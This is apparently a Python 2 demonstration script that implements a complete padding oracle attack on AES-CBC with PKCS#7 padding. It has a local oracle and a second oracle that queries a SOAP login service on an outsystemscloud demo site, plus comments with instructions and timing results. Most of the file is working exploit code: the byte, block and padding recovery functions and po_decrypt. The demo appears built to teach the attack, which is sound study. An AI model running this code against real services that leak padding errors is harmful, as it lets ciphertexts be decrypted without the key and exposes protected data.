#!/usr/bin/python

import base64
from base64 import b64decode as b64dec
import binascii
import StringIO

def xor(a,b):
    if len(a) > len(b):
        return "".join([ chr(ord(x)^ord(y)) for (x,y) in zip(a[:len(b)], b)])
    else:
        return "".join([ chr(ord(x)^ord(y)) for (x,y) in zip(a, b[:len(b)])])

class PaddingException(Exception):
    pass

class PKCS7Encoder(object):
    '''
    RFC 2315: PKCS#7 page 21
    Some content-encryption algorithms assume the
    input length is a multiple of k octets, where k > 1, and
    let the application define a method for handling inputs
    whose lengths are not a multiple of k octets. For such
    algorithms, the method shall be to pad the input at the
    trailing end with k - (l mod k) octets all having value k -
    (l mod k), where l is the length of the input. In other
    words, the input is padded at the trailing end with one of
    the following strings:

                     01 -- if l mod k = k-1
            02 02 -- if l mod k = k-2
                        .
                        .
                        .
          k k ... k k -- if l mod k = 0

    The padding can be removed unambiguously since all input is
    padded and no padding string is a suffix of another. This
    padding method is well-defined if and only if k < 256;
    methods for larger k are an open issue for further study.
    '''
    def __init__(self, k=16):
        self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, text):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        nl = len(text)
        val = int(binascii.hexlify(text[-1]), 16)
        if val > self.k or val > nl:
            raise PaddingException()
        if text[-val:] != chr(val)*val:
            raise PaddingException()

        l = nl - val
        return text[:l]

    ## @param text The text to encode.
    def encode(self, text):
        '''
        Pad an input string according to PKCS#7
        '''
        l = len(text)
        output = StringIO.StringIO()
        val = self.k - (l % self.k)
        for _ in xrange(val):
            output.write('%02x' % val)
        return text + binascii.unhexlify(output.getvalue())


from Crypto import Random
from Crypto.Cipher import AES
import time


padder = PKCS7Encoder()
prng   = Random.new()

# Random 256 bit AES key
key = prng.read(32)


def encrypt(key, plaintext):
    iv = prng.read(16)
    padded_text = padder.encode(plaintext)
    cipherbytes = AES.new(key, AES.MODE_CBC, iv).encrypt(padded_text)
    return iv + cipherbytes

def decrypt(key, ciphertext):
    iv = ciphertext[:16]
    cipherbytes = ciphertext[16:]
    padded_text = AES.new(key, AES.MODE_CBC,iv).decrypt(ciphertext[16:])
    return padder.decode(padded_text)


def simple_padding_oracle(ciphertext):
    try:
        decrypt(key, ciphertext)
        return False
    except PaddingException as e:
        return True

def guess_byte(ciphertext, known, po):
    pad_size = len(known) + 1
    pad = chr(pad_size)*(pad_size-1)
    prefix = chr(0)*(16-pad_size)
    suffix = xor(pad, known) + chr(0)*16
    for b in xrange(1, 256):
        if not po(xor(prefix + chr(b ^ pad_size) + suffix, ciphertext)):
            return chr(b)

def guess_block(ciphertext, known, po):
    for x in xrange(16 - len(known)):
        known = guess_byte(ciphertext, known, po) + known
    return known

def guess_pad(ciphertext, po):
    pad = 16
    for i in xrange(16):
        if po(xor(ciphertext, chr(0)*i + chr(1) + chr(0)*(16 + 16 - i - 1))):
            pad = 16 - i
            break
        else:
            pass
    return chr(pad)*pad


def po_decrypt(ciphertext, po):
    res = guess_block(ciphertext[-32:], guess_pad(ciphertext[-32:], po), po)
    ciphertext = ciphertext[:-16]
    while len(ciphertext) > 16:
        res = guess_block(ciphertext[-32:], '', po) + res
        ciphertext = ciphertext[:-16]
    return padder.decode(res)


import time
def time_decrypts(n):
    c = encrypt(key, 'jibberish')
    start = time.time()
    for x in xrange(n):
        nop = decrypt(key, c)
    return time.time() - start


import suds
import suds_requests

po_service = suds.client.Client('https://ardoric.outsystemscloud.com/PaddingOracle/LoginService.asmx?WSDL', transport=suds_requests.RequestsTransport()).service

def ws_padding_oracle(ciphertext):
   try:
       po_service.Login('some_user', base64.b64encode(ciphertext))
       return False
   except suds.WebFault as fault:
       return 'Padding' in fault.message

# Go to https://ardoric.outsystemscloud.com/PaddingOracle/
# Encrypt a string there
# Run po_decrypt(b64dec('<your string>'), ws_padding_oracle) to check how long it takes to decrypt.
# All the Login method does is decrypt the string and let the error propagate upwards
# Takes 40s to decrypt a 3 letter message, 360 to decrypt a two block message



